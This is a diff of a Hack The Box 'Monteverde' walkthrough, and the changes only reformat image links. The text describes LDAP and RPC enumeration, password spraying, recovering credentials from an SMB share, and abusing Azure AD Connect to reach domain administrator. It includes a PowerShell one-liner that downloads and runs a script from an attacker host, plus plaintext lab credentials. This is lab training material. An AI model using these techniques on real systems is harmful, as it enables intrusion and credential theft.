@@ -80,7 +80,7 @@ Nmap done: 1 IP address (1 host up) scanned in 67.09 seconds
 
 I ran an LDAPsearch query and obtained a ton of information.:
 
-![[./_resources/HTB_Monteverde.resources/ldapsearch_results.txt]]
+![](./_resources/HTB_Monteverde.resources/ldapsearch_results.txt)
 
 I also obtained the list of users here with CME:
 ```
@@ -102,12 +102,12 @@ SMB        10.10.10.172    445    MONTEVERDE      MEGABANK.LOCAL\smor
 ```
 
 I was able to login with a null session with RPCclient and query information.:
-![[./_resources/HTB_Monteverde.resources/image.png]]
+![](./_resources/HTB_Monteverde.resources/image.png)
 
 I got stuck and had to look for a nudge by checking a WT. However, I realized, I needed to try password spraying. I can use CME and try the username as the password for each user.
 
 In performing a dictionary attack on the user SABatchJobs, I found the username is the password.:
-![[./_resources/HTB_Monteverde.resources/image.1.png]]
+![](./_resources/HTB_Monteverde.resources/image.1.png)
 Credentials:
 ```
 Uname: SABatchJobs
@@ -115,7 +115,7 @@ Passwd: SABatchJobs
 ```
 
 Now I can access the SMB shares as shown below:
-![[./_resources/HTB_Monteverde.resources/image.2.png]]
+![](./_resources/HTB_Monteverde.resources/image.2.png)
 I did not find anything in the azure\_uploads, IPC$ or any other directories except for one. In checking the users$ directory, I found that the mhope user had an azure.xml file which I downloaded with the get command. Upon inspecting it, I found another password.:
 ```
 ─$ cat azure.xml 
@@ -142,13 +142,13 @@ Passd: 4n0therD4y@n0th3r$
 ```
 
 I was now able to winrm into the machine with the above credentials with evil-winrm.:
-![[./_resources/HTB_Monteverde.resources/image.3.png]]
+![](./_resources/HTB_Monteverde.resources/image.3.png)
 
 I found the user.txt hash on Mike's Desktop directory.:
-![[./_resources/HTB_Monteverde.resources/image.4.png]]
+![](./_resources/HTB_Monteverde.resources/image.4.png)
 
 Next, I found the following file which shows an email address with null credentials.:
-![[./_resources/HTB_Monteverde.resources/image.5.png]]
+![](./_resources/HTB_Monteverde.resources/image.5.png)
 
 ```
 Uname: john@a67632354763outlook.onmicrosoft.com
@@ -158,14 +158,14 @@ Passwd: {NULL}
 I realized this post has a good PoC that works well with abusing Azure AD in this instance specifically the Azure Connect.: <https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c>
 
 I had the modify the code so reflect the walkthrough version by 0xdf by modifying the first line.:
-![[./_resources/HTB_Monteverde.resources/image.6.png]]
+![](./_resources/HTB_Monteverde.resources/image.6.png)
 
 After uploading the file via a python server on my attacker machine I was also able to execute the script immediately using the awesome powershell one liner.:
 ```
 powershell.exe IEX(New-Object Net.Webclient).DownloadString('http://[attacker IP]:[web server port]/Invoke-MS16032.ps1')
 ```
 
-![[./_resources/HTB_Monteverde.resources/image.7.png]]
+![](./_resources/HTB_Monteverde.resources/image.7.png)
 Credentials:
 ```
 Domain: MEGABANK.LOCAL
@@ -174,9 +174,9 @@ Passwd: d0m@in4dminyeah!
 ```
 
 I was then finally able to obtain Administrator privileges by using the above credentials in a new evil-winrm shell.:
-![[./_resources/HTB_Monteverde.resources/image.8.png]]
+![](./_resources/HTB_Monteverde.resources/image.8.png)
 
 root.txt hash obtained!:
-![[./_resources/HTB_Monteverde.resources/image.9.png]]
+![](./_resources/HTB_Monteverde.resources/image.9.png)
 
 **###ROOTED!!!###**
